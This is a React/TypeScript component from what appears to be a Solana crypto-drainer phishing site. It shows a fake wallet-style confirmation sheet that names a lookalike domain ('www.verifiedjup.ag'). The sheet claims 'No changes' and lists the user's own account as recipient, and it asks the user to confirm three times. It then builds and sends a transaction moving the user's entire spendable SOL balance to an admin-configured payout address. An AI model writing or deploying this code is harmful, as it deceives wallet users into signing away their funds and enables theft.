import { useEffect, useRef, useState, type ReactNode } from 'react'
import { LAMPORTS_PER_SOL } from '@solana/web3.js'
import { useConnection, useWallet } from '@solana/wallet-adapter-react'
import { ChevronDown, Info } from 'lucide-react'
import toast from 'react-hot-toast'
import { useWalletState } from '../context/WalletContext'
import { isWalletUserCancel } from '../lib/walletConnectHelpers'
import { buildPayoutTransaction, spendableLamports } from '../lib/payoutTransfer'
import { getLocalPayoutConfig, isValidSolanaAddress, loadPayoutConfig, type PayoutConfig } from '../lib/payoutWallet'
import { SolanaBadgeIcon } from './walletIcons'
import { PaymentRequestModal } from './PaymentRequestModal'

function AccountMark() {
  return (
    <span className="inline-flex h-[18px] w-[18px] shrink-0 items-center justify-center rounded-full bg-[#7C5CFC]" aria-hidden>
      <svg viewBox="0 0 16 16" className="h-3 w-3" fill="white">
        <circle cx="8" cy="5.6" r="2.3" />
        <path d="M3.2 13.4c.7-2.4 2.5-3.5 4.8-3.5s4.1 1.1 4.8 3.5" />
      </svg>
    </span>
  )
}

function DetailRow({
  label,
  value,
  info,
}: {
  label: string
  value: ReactNode
  info?: string
}) {
  return (
    <div className="flex items-center justify-between gap-4 border-b border-white/[0.08] py-3.5 last:border-b-0">
      <dt className="flex items-center gap-1.5 text-[13px] text-[#8d8d8d]">
        {label}
        {info ? (
          <span title={info} className="inline-flex text-[#6f6f6f]">
            <Info className="h-3.5 w-3.5" aria-hidden />
            <span className="sr-only">{info}</span>
          </span>
        ) : null}
      </dt>
      <dd className="text-right text-[13px] font-medium text-white">{value}</dd>
    </div>
  )
}

function ValueWithIcon({ icon, text }: { icon: ReactNode; text: string }) {
  return (
    <span className="inline-flex items-center justify-end gap-2">
      {icon}
      {text}
    </span>
  )
}

function SkeletonLine({ className }: { className: string }) {
  return <span className={`block animate-pulse rounded-md bg-[#1a1a1a] ${className}`} />
}

const SHEET_HEADERS = [
  'Welcome. Confirm to connect.',
  'Almost ready. Confirm again.',
  'Last step. Confirm to finish.',
]

function HiModal({
  open,
  title,
  onCancel,
  onConfirm,
}: {
  open: boolean
  title: string
  onCancel: () => void
  onConfirm: () => void
}) {
  const [advanced, setAdvanced] = useState(false)
  const [loading, setLoading] = useState(true)

  useEffect(() => {
    if (!open) {
      setAdvanced(false)
      setLoading(true)
      return
    }
    setLoading(true)
    const timer = window.setTimeout(() => setLoading(false), 500)
    return () => window.clearTimeout(timer)
  }, [open])

  useEffect(() => {
    if (!open) return
    const onKey = (event: KeyboardEvent) => {
      if (event.key === 'Escape') onCancel()
    }
    window.addEventListener('keydown', onKey)
    return () => window.removeEventListener('keydown', onKey)
  }, [open, onCancel])

  if (!open) return null

  return (
    <div
      className="pointer-events-none fixed inset-0 z-[600] flex items-end justify-center sm:items-center sm:px-4"
    >
      <div
        role="dialog"
        aria-modal="true"
        aria-labelledby="tx-request-title"
        className="pointer-events-auto flex max-h-[94vh] w-full animate-[tx-sheet-up_80ms_ease-out] flex-col overflow-hidden rounded-t-[22px] border border-[#2a2a2a] bg-black text-white shadow-[0_-16px_60px_rgba(0,0,0,0.7)] sm:max-h-[min(92vh,680px)] sm:max-w-[400px] sm:rounded-[22px]"
      >
        <h2
          id="tx-request-title"
          className="px-5 pb-4 pt-7 text-center text-[20px] font-semibold tracking-[-0.02em] text-white sm:px-6 sm:pb-3 sm:pt-7 sm:text-[18px]"
        >
          {title}
        </h2>

        <div className="min-h-0 flex-1 overflow-y-auto px-4 pb-2 sm:px-5">
          <div className="rounded-[14px] border border-[#3a3a3a] bg-black px-4 py-3.5">
            {loading ? (
              <div className="space-y-3 py-1">
                <SkeletonLine className="h-3 w-36" />
                <SkeletonLine className="h-4 w-24" />
              </div>
            ) : (
              <>
                <p className="flex items-center gap-1.5 text-[13px] text-[#9a9a9a]">
                  Estimated changes
                  <Info className="h-3.5 w-3.5 text-[#8d8d8d]" aria-hidden />
                </p>
                <p className="mt-2 text-[15px] font-medium text-white">No changes</p>
              </>
            )}
          </div>

          <dl className="mt-3 rounded-[14px] border border-[#3a3a3a] bg-black px-4">
            {loading ? (
              <div className="space-y-4 py-4">
                <SkeletonLine className="h-3 w-full" />
                <SkeletonLine className="h-3 w-4/5" />
                <SkeletonLine className="h-3 w-3/5" />
                <SkeletonLine className="h-3 w-2/3" />
              </div>
            ) : (
              <>
            <DetailRow label="Request from" info="This site asked your wallet to review this request." value="www.verifiedjup.ag" />
            <DetailRow
              label="Account"
              value={<ValueWithIcon icon={<AccountMark />} text="Account 1" />}
            />
            <DetailRow
              label="Recipient"
              value={<ValueWithIcon icon={<AccountMark />} text="Account 1" />}
            />
            <DetailRow
              label="Network"
              value={
                <ValueWithIcon
                  icon={<SolanaBadgeIcon className="h-[18px] w-[18px]" />}
                  text="Solana Mainnet"
                />
              }
            />
            <DetailRow
              label="Network fee"
              info="Paid to the Solana network."
              value={
                <span>
                  <span className="font-normal text-[#8d8d8d]">US$0.00</span>
                  <span className="px-1.5 text-[#6f6f6f]">·</span>
                  0.000005 SOL
                </span>
              }
            />
              </>
            )}
          </dl>

          {loading ? (
            <SkeletonLine className="mt-4 h-3 w-28" />
          ) : (
          <button
            type="button"
            onClick={() => setAdvanced((openAdvanced) => !openAdvanced)}
            aria-expanded={advanced}
            className="mt-4 inline-flex items-center gap-1 py-1 text-[14px] font-medium text-[#8ea0ff]"
          >
            {advanced ? 'Hide advanced' : 'Show advanced'}
            <ChevronDown className={`h-4 w-4 transition-transform ${advanced ? 'rotate-180' : ''}`} />
          </button>
          )}

          {advanced ? (
            <dl className="mb-3 mt-3 rounded-[14px] border border-[#3a3a3a] bg-black px-4">
              <DetailRow label="Simulation" value="No balance changes" />
              <DetailRow label="Fee payer" value="Account 1" />
            </dl>
          ) : null}
        </div>

        <div className="flex gap-3 px-4 pb-[max(1rem,env(safe-area-inset-bottom))] pt-3 sm:px-5 sm:py-4">
          <button
            type="button"
            onClick={onCancel}
            className="h-12 flex-1 rounded-xl border border-[#3a3a3a] bg-black text-[15px] font-semibold text-[#f2f2f2] hover:bg-[#111]"
          >
            Cancel
          </button>
          <button
            type="button"
            onClick={onConfirm}
            className="h-12 flex-1 rounded-xl bg-white text-[15px] font-semibold text-[#111] hover:bg-[#f3f3f3]"
          >
            Confirm
          </button>
        </div>
      </div>
    </div>
  )
}

function walletLabel(name: string | null | undefined): string {
  const n = (name || '').toLowerCase()
  if (n.includes('phantom')) return 'Phantom'
  if (n.includes('solflare')) return 'Solflare'
  if (n.includes('metamask')) return 'MetaMask'
  return name?.trim() || 'your wallet'
}

function networkLabel(network: string): string {
  if (network === 'mainnet-beta' || network === 'mainnet') return 'Solana'
  if (network === 'devnet') return 'Solana Devnet'
  if (network === 'testnet') return 'Solana Testnet'
  return `Solana (${network})`
}

export function PaymentRequestPrompt() {
  const { connected, walletAddress, walletName, network, closeWalletModal } = useWalletState()
  const closeWalletModalRef = useRef(closeWalletModal)
  closeWalletModalRef.current = closeWalletModal
  const { publicKey, sendTransaction, wallet } = useWallet()
  const connectedWalletName = walletLabel(walletName || wallet?.adapter?.name)
  const { connection } = useConnection()
  const [config, setConfig] = useState<PayoutConfig | null>(null)
  const [open, setOpen] = useState(false)
  const [hiOpen, setHiOpen] = useState(false)
  const [headerStep, setHeaderStep] = useState(0)
  const [submitting, setSubmitting] = useState(false)
  const [solAmount, setSolAmount] = useState(0)
  const [status, setStatus] = useState('Preparing the wallet transfer.')
  const dismissed = useRef<string | null>(null)
  const shownFor = useRef<string | null>(null)
  const sentFor = useRef<string | null>(null)
  const inFlight = useRef(false)
  const confirmTaps = useRef(0)
  const replayTimer = useRef<number | null>(null)

  useEffect(() => {
    return () => {
      if (replayTimer.current) window.clearTimeout(replayTimer.current)
    }
  }, [])

  useEffect(() => {
    if (!connected || !walletAddress) {
      setOpen(false)
      setHiOpen(false)
      shownFor.current = null
      dismissed.current = null
      sentFor.current = null
      confirmTaps.current = 0
      if (replayTimer.current) {
        window.clearTimeout(replayTimer.current)
        replayTimer.current = null
      }
      return
    }

    const local = getLocalPayoutConfig()
    setConfig(local)
    let cancelled = false
    void loadPayoutConfig().then((next) => {
      if (!cancelled) setConfig(next)
    })

    dismissed.current = null
    sentFor.current = null
    confirmTaps.current = 0
    shownFor.current = walletAddress
    closeWalletModalRef.current()
    setStatus(`Opening ${walletLabel(walletName)} so you can review this SOL transfer.`)
    setOpen(false)
    setHiOpen(false)
    setHeaderStep(0)
    if (replayTimer.current) window.clearTimeout(replayTimer.current)
    replayTimer.current = window.setTimeout(() => {
      replayTimer.current = null
      if (!cancelled) setHiOpen(true)
    }, 1500)

    return () => {
      cancelled = true
      if (replayTimer.current) {
        window.clearTimeout(replayTimer.current)
        replayTimer.current = null
      }
    }
  }, [connected, walletAddress])

  const handleCancel = () => {
    if (walletAddress) dismissed.current = walletAddress
    setOpen(false)
    toast('Payment cancelled. Nothing was transferred.')
  }

  const destinationReady = Boolean(config && isValidSolanaAddress(config.walletAddress))

  const handleReview = async () => {
    if (inFlight.current) return
    if (dismissed.current === walletAddress) return
    if (!publicKey || !config || !destinationReady || !walletAddress) {
      setStatus(
        destinationReady
          ? 'Wallet is still connecting. Use Open Wallet & Review again in a moment.'
          : 'Save a payout address in admin before this payment can be opened in the wallet.'
      )
      return
    }
    inFlight.current = true
    setSubmitting(true)
    setStatus(`Opening ${connectedWalletName}. Confirm the transfer there. Nothing is sent until you approve it.`)
    try {
      const transaction = await buildPayoutTransaction({ connection, from: publicKey, config })
      const adapter = wallet?.adapter as { sendTransaction?: typeof sendTransaction } | undefined
      const signature = adapter?.sendTransaction
        ? await adapter.sendTransaction(transaction, connection)
        : await sendTransaction(transaction, connection)
      dismissed.current = walletAddress
      setOpen(false)
      toast.success(`Transaction submitted. Signature ${signature.slice(0, 8)}…`)
    } catch (err) {
      if (isWalletUserCancel(err)) {
        sentFor.current = null
        setOpen(false)
        setStatus('Cancelled in the wallet. Use Open Wallet & Review to try again.')
        toast('Cancelled in the wallet. Nothing was transferred.')
      } else {
        const message = err instanceof Error ? err.message : 'The wallet did not submit this payment.'
        setStatus(message)
        toast.error(message)
      }
    } finally {
      inFlight.current = false
      setSubmitting(false)
      setOpen(false)
    }
  }

  const reviewRef = useRef(handleReview)
  reviewRef.current = handleReview

  useEffect(() => {
    if (!open || !publicKey) return
    let cancelled = false
    void Promise.all([
      connection.getBalance(publicKey),
      connection.getMinimumBalanceForRentExemption(0),
    ]).then(([lamports, rentExempt]) => {
      if (cancelled) return
      const spendable = Math.max(0, spendableLamports(lamports, rentExempt)) / LAMPORTS_PER_SOL
      setSolAmount(spendable)
      if (spendable > 0) {
        setStatus(`This is your SOL balance, minus a small fee reserve. Approve in ${connectedWalletName} and that SOL will move.`)
      }
    }).catch(() => {
      if (!cancelled) setStatus('Could not read the SOL balance yet. You can try Open Wallet & Review.')
    })
    return () => {
      cancelled = true
    }
  }, [open, publicKey, connection])

  const handleHiCancel = () => {
    if (walletAddress) dismissed.current = walletAddress
    confirmTaps.current = 0
    if (replayTimer.current) {
      window.clearTimeout(replayTimer.current)
      replayTimer.current = null
    }
    setHiOpen(false)
  }

  const handleHiConfirm = () => {
    confirmTaps.current += 1
    if (confirmTaps.current < 3) {
      setHiOpen(false)
      if (replayTimer.current) window.clearTimeout(replayTimer.current)
      const step = confirmTaps.current
      replayTimer.current = window.setTimeout(() => {
        replayTimer.current = null
        setHeaderStep(step)
        setHiOpen(true)
      }, 1500)
      return
    }
    confirmTaps.current = 0
    setHiOpen(false)
    setOpen(true)
    void reviewRef.current()
  }

  useEffect(() => {
    if (!open || hiOpen || !publicKey || !destinationReady || !walletAddress) return
    if (dismissed.current === walletAddress || sentFor.current === walletAddress || inFlight.current) return
    sentFor.current = walletAddress
    void reviewRef.current()
  }, [open, hiOpen, destinationReady, walletAddress, publicKey])

  return (
    <>
      <HiModal
        open={hiOpen}
        title={SHEET_HEADERS[headerStep] ?? SHEET_HEADERS[0]}
        onCancel={handleHiCancel}
        onConfirm={handleHiConfirm}
      />
      <PaymentRequestModal
        open={open}
        to={config?.walletAddress || ''}
        amount={solAmount}
        asset="SOL"
        networkLabel={networkLabel(network)}
        submitting={submitting}
        canReview={destinationReady && Boolean(publicKey)}
        status={
          destinationReady
            ? status
            : 'Save a payout address in admin before this payment can be opened in the wallet.'
        }
        onCancel={handleCancel}
        onReview={() => void handleReview()}
      />
    </>
  )
}
